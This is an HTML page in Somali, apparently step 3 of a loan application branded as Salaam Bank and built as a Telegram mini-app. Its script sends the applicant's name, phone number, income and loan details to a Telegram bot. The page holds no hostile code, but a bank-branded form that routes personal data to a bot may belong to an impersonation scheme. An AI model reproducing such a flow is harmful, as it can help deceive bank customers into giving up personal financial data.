<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Codsiga Maalgelinta - Soo Koobid</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0066b2; /* Salaam Bank Logo Blue */
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333333;
            min-height: 100vh;
        }

        .nav-header {
            width: 100%;
            background-color: #005291; /* Darker Blue Header */
            padding: 18px 20px;
            color: #ffffff;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
        }

        .bank-logo {
            font-size: 22px;
            font-weight: bold;
        }

        .form-card {
            background: #ffffff; /* Clean White Card */
            width: 92%;
            max-width: 480px;
            margin-top: 20px;
            padding: 30px 20px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
            box-sizing: border-box;
        }

        h2 {
            text-align: center;
            margin: 0;
            font-size: 24px;
            color: #0066b2;
            font-weight: 700;
        }

        .step-info {
            text-align: center;
            font-size: 14px;
            color: #666666;
            margin: 10px 0 25px;
        }

        .progress-box {
            display: flex;
            gap: 8px;
            margin-bottom: 35px;
        }

        .bar {
            height: 6px;
            flex: 1;
            background: #008744; /* Salaam Bank Logo Green Highlight */
            border-radius: 3px;
        }

        .input-wrap {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #444444;
        }

        select, input {
            width: 100%;
            padding: 14px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            background: #ffffff;
            color: #333333;
            outline: none;
        }

        select:focus, input:focus {
            border-color: #0066b2;
        }

        select option {
            background-color: #ffffff;
            color: #333333;
        }

        .summary-box {
            background-color: #f4f8fb;
            border-left: 5px solid #0066b2;
            padding: 20px;
            border-radius: 8px;
            margin: 25px 0;
            border: 1px solid #e1ecf4;
        }

        .summary-box h3 {
            margin: 0 0 15px 0;
            font-size: 17px;
            font-weight: 700;
            color: #0066b2;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            border-bottom: 1px solid #e2e8f0;
            padding-bottom: 8px;
        }

        .summary-label {
            color: #666666;
            font-size: 14px;
        }

        .summary-value {
            font-weight: 600;
            font-size: 14px;
            color: #333333;
            text-align: right;
        }

        .btn-container {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .back-btn {
            background-color: #f1f5f9;
            color: #475569;
            border: 1px solid #cbd5e1;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
        }

        .submit-btn {
            background-color: #008744; /* Salaam Bank Logo Green */
            color: #ffffff;
            border: none;
            padding: 18px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            transition: background-color 0.2s ease;
        }

        .submit-btn:hover {
            background-color: #006e37;
        }

        .submit-btn:active {
            background-color: #00542a;
        }

        .footer-text {
            text-align: center;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.8);
            margin: 40px 0 30px;
        }
    </style>
</head>

<body>

<div class="nav-header">
    <div onclick="goBack()" style="cursor:pointer; font-size:18px; color: #ffffff;">← Dib u noqyo</div>
    <div class="bank-logo">Salaam Bank</div>
    <div style="font-size: 24px;">☰</div>
</div>

<div class="form-card">
    <h2>Codsiga Maalgelinta</h2>
    <p class="step-info">Talaabada 3 oo 3 ah</p>

    <div class="progress-box">
        <div class="bar"></div>
        <div class="bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>Xaaladda Shaqada</label>
        <select id="jobStatus">
            <option value="Shaqaale">Shaqaale</option>
            <option value="Ganacsade">Ganacsade</option>
            <option value="Aroos / Arday">Arday</option>
            <option value="Shaqo La'aan">Shaqo La'aan</option>
            <option value="Hawlgalay">Hawlgalay (Pensioneer)</option>
        </select>
    </div>

    <div class="input-wrap">
        <label>Dakhliga Sannadkii ($ USD)</label>
        <input type="text" id="income" placeholder="Tusaale: 12000">
    </div>

    <div class="summary-box">
        <h3>Soo Koobid Codsiga</h3>

        <div class="summary-item">
            <span class="summary-label">Qaddarka Maalgelinta:</span>
            <span class="summary-value" id="sumAmount">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">Muddada Bixinta:</span>
            <span class="summary-value" id="sumDuration">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">Ujeeddada:</span>
            <span class="summary-value" id="sumPurpose">--</span>
        </div>

        <div class="summary-item">
            <span class="summary-label">Codsadaha:</span>
            <span class="summary-value" id="sumName">--</span>
        </div>
    </div>

    <div class="btn-container">
        <button type="button" class="submit-btn" onclick="submitForm()">DIR CODSIGA</button>
        <button type="button" class="back-btn" onclick="goBack()">DIB U NOQO</button>
    </div>
</div>

<div class="footer-text">© 2026 Salaam Bank Somalia. Hantida oo dhan waa la dhowray.</div>

<script>
window.onload = () => {
    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const amount = localStorage.getItem('amount');
    const duration = localStorage.getItem('loanDuration');
    const purpose = localStorage.getItem('loanPurpose');
    const fName = localStorage.getItem('firstName') || "";
    const lName = localStorage.getItem('lastName') || "";

    document.getElementById('sumAmount').innerText = amount ? `$${Number(amount).toLocaleString()} USD` : "--";
    document.getElementById('sumDuration').innerText = duration || "--";
    document.getElementById('sumPurpose').innerText = purpose || "--";
    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
};

function submitForm() {
    const tg = window.Telegram?.WebApp;

    const data = {
        amount: localStorage.getItem('amount'),
        duration: localStorage.getItem('loanDuration'),
        purpose: localStorage.getItem('loanPurpose'),
        firstName: localStorage.getItem('firstName'),
        lastName: localStorage.getItem('lastName'),
        phone: localStorage.getItem('phone'),
        jobStatus: document.getElementById('jobStatus').value,
        income: document.getElementById('income').value
    };

    if (tg && tg.sendData) {
        tg.sendData(JSON.stringify(data));
        setTimeout(() => {
            window.location.href = "/page5";
        }, 500);
    } else {
        console.log("Submitted:", data);
        window.location.href = "/page5";
    }
}

function goBack() {
    window.location.href = "/page3";
}
</script>

</body>
</html>
